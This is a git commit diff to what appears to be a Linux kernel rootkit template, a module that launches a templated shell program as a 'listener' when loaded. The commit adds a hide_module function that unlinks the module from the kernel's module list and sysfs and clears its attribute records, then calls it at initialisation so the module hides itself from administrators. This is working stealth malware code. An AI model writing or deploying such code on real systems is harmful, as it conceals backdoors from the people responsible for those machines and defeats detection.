a6d3c6e402221a0a9ad89fa12d33b289504978be
ejohn <ebyjohn@gmail.com>
2015-03-11 16:57:12 -0700

    hide module

--- template.c
+++ template.c
@@ -12,6 +12,8 @@ MODULE_AUTHOR("Ciaran McNally - maK");
 #define SHELL "SHELL_TEMPLATE"
 #define CLEANUP "CLEAN_TEMPLATE"
 
+static struct list_head *modList;
+
 static int start_listener(void){
 	char *argv[] = { SHELL, NULL, NULL };
 	static char *env[] = {
@@ -19,6 +21,17 @@ static int start_listener(void){
 		"TERM=linux",
 		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+}
+
+
+//Hiding the kernel module
+void hide_module(void){
+
+	modList = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	THIS_MODULE->sect_attrs = NULL;
+	THIS_MODULE->notes_attrs = NULL;
 }
 
 static int kill_listener(void){
@@ -32,6 +45,7 @@ static int kill_listener(void){
 
 
 static int init_mod(void){
+	hide_module();
 	return start_listener();
 }
 
